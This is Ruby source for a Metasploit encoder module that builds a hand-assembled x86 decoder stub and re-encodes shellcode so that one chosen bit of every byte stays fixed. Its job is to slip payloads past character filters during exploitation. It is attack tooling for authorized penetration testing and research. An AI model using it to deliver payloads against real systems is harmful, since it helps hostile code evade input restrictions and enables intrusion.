##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

#
# NOTE: this encoder currently has only be tested using bit 5 set to on.
#
# The decoder has been tested with all possible values, but the decoder stub
# is was not designed to bypass restrictions other than "bit 5 must be on"..
#
class MetasploitModule < Msf::Encoder

  # This encoder has a manual ranking because it should only be used in cases
  # where information has been explicitly supplied, specifically
  # BitNumber and BitValue.
  Rank = ManualRanking

  def initialize
    super(
      'Name'             => 'Single Static Bit',
      'Description'      => 'Static value for specific bit',
      'Author'           => 'jduck',
      'Arch'             => ARCH_X86,
      'License'          => MSF_LICENSE,
      'EncoderType'      => Msf::Encoder::Type::SingleStaticBit
      )

    # this shouldn't be present in the decoder stub.
    @key_marker = 0x1010
  end

  #
  # Returns the decoder stub that is adjusted for the size of
  # the buffer being encoded
  #
  def decoder_stub(state)

    bit_num = (datastore['BitNumber'] || 5).to_i
    bit_val = (datastore['BitValue'] || true)

    # variables:
    # bit to ignore                                  (global - harcoded)
    # buf len (can be deduced with a jmp/call/pop)   (global - ebx)
    # current source byte ptr                        (global - esi)
    # current dest byte ptr                          (global - edi) ?
    # current dest byte                              (global - ah)  ?
    # number of bits accumulated                     (global - ebp) ?
    # current source byte                            (outer  - al)
    # bit index (for this byte)                      (inner  - cl)  ?
    pre_init = ""
    pre_init << "\x31\xed"        # xor ebp, ebp               - no bits accumulated
    pre_init << "\x83\xe1\x01"    # and ecx, $0x1              - init inner loop counter (set to 0/1)
    pre_init << "\x83\xe3\x01"    # and ebx, $0x1              - init buffer length
    pre_init << "\x66\xbb" + [@key_marker].pack('v')         # - load encrypted buffer length
    pre_init << "\x66\x81\xf3" + [@key_marker].pack('v')     # - xor decrypt buffer length

    # we stored an entire byte, move to the next one
    next_byte = ""
    next_byte << "\x83\xef\xff"  # sub edi, 0xffffffff         - increment dst pointer
    next_byte << "\x31\xed"      # xor ebp, ebp                - no bits accumulated

    # inside the loop, we need to extract a bit, as
    # specified by:
    #
    # ecx-1  - bit number to extract
    # al     - byte to extract it from
    get_a_bit = ""
    get_a_bit << "\x60"          # pusha                       - save all registers
    get_a_bit << "\x83\xe9\x01"  # sub ecx, 1                  - account for 1-based counting
    get_a_bit << "\x74\x06"      # jz +6                       - skip dividing if bit zero
    get_a_bit << "\xb3\x02"      # mov bl, 2                   - set divisor to 2
    # divide_it:
    get_a_bit << "\xf6\xf3"      # div bl                      - do the division
    get_a_bit << "\xe2" + [-1 * (2+2)].pack('C')             # - divide again..
    # store_bit:
    get_a_bit << "\x83\xe0\x01"  # and eax, 0x01               - we only want the lowest bit
    get_a_bit << "\x6b\x2f\x02"  # imul ebp, 2, [edi]          - load [edi], shifted left by 1, to ebp
    get_a_bit << "\x09\xe8"      # or ebp, eax                 - set bit 0
    get_a_bit << "\xaa"          # stosb al, [edi]             - store byte back
    get_a_bit << "\x61"          # popa                        - restore previous ebx/eax
    get_a_bit << "\x83\xed\xff"  # sub ebp, 0xffffffff         - increment bits stored

    inner_init = ""
    inner_init << "\xb1\x08"      # mov cl, $0x8               - init loop counter

    inner_loop = ""
    # process_bits:
    inner_loop << "\x80\xf9"     # cmp cl, <ignore_bit + 1>   - is this the one to ignore?
    inner_loop << [(bit_num+1)].pack('C')
    len = get_a_bit.length + 3 + 2 + next_byte.length
    inner_loop << "\x74" + [len].pack('C')                   # - je next_bit
    inner_loop << get_a_bit
    inner_loop << "\x83\xfd\x08"  # cmp ebp, $0x8              - got 8 bits now?
    inner_loop << "\x75" + [next_byte.length].pack('C')      # - jne to next_bit
    # next_dst_byte:
    inner_loop << next_byte
    # next_bit:
    # I really wish this silly padding wasn't necessary, however removing the bad characters in the
    # jump/call displacements has proven difficult otherwise.
    inner_loop << "\x90" * 0x1a   # nops                       - for padding (so relative jumps don't have badchars)
    len = -1 * (inner_loop.length+2)
    inner_loop << "\xe2" + [len].pack('C')                   # - loop process_bits

    # prefixed by:                # jmp data_beg_call
    outer_init = ""
    # get_data_beg:
    outer_init << "\x5e"          # pop esi                    - ptr to beginning of data
    outer_init << pre_init
    outer_init << "\x89\xf7"      # mov edi, esi               - decode in place, init dst ptr

    outer_loop = ""
    #outer_loop << "\x90" * (0xd+6)
    outer_loop << "\x83\xe0\x7f"  # and eax, 0x7f              - we only want the low byte
    outer_loop << "\xac"          # lods   al, [esi]           - load src byte
    outer_loop << inner_init << inner_loop
    outer_loop << "\x83\xeb\x01"  # sub ebx, 1                 - 1 byte down!
    outer_loop << "\x74\x07"      # jz +(2+5)                  - jump to data!
    len = -1 * (outer_loop.length+2)
    # next_byte:
    outer_loop << "\xeb" + [len].pack('C')                   # - jmp process_byte
    # data_beg_call:

    decoder = outer_init + outer_loop
    jmp = "\xeb" + [decoder.length].pack('C')
    call = "\xe8" + [-1 * (decoder.length+5)].pack('V')
    decoder = jmp + decoder + call

    # encoded sled
    state.context = ''

    return decoder
  end

  def encode_block(state, block)
    bit_num = (datastore['BitNumber'] || 5).to_i
    bit_num = (7-bit_num)
    bit_val = (datastore['BitValue'] || true)

    encoded = ''
    new_byte = 0
    nbits = 0

    block.unpack('C*').each do |ch|
      7.step(0,-1) do |x|

        # is this the special bit?
        if (nbits == bit_num)
          new_byte <<= 1 if nbits > 0
          new_byte |= 1 if bit_val
          nbits += 1

          # do we have a full byte?
          if nbits == 8
            encoded << new_byte.chr
            new_byte = 0
            nbits = 0
          end
        end

        # we have space, add it in
        new_byte <<= 1 if nbits > 0
        new_byte += 1 if (((ch >> x) & 1) > 0)
        nbits += 1

        # do we have a full byte?
        if nbits == 8
          encoded << new_byte.chr
          new_byte = 0
          nbits = 0
        end
      end
    end

    # if we have bits left, pad out to a whole byte
    if nbits > 0
      while nbits < 8
        new_byte <<= 1
        new_byte |= 1 if (nbits == bit_num) and bit_val
        nbits += 1
      end
      encoded << new_byte.chr
    end

    return encoded
  end

  #
  # Appends the encoded context portion.
  #
  def encode_end(state)
    state.encoded += state.context

    xor_key = 0
    xor_key_str = ''
    enc_len_str = ''
    loop do
      xor_key = rand(0x10000)
      xor_key_str = [xor_key].pack('v')
      enc_len_str = [state.encoded.length ^ xor_key].pack('v')
      next if has_badchars?(xor_key_str, state.badchars)
      next if has_badchars?(enc_len_str, state.badchars)
      break
    end

    marker_str = [@key_marker].pack('v')

    state.encoded.sub!(marker_str, enc_len_str)
    state.encoded.sub!(marker_str, xor_key_str)
  end
end
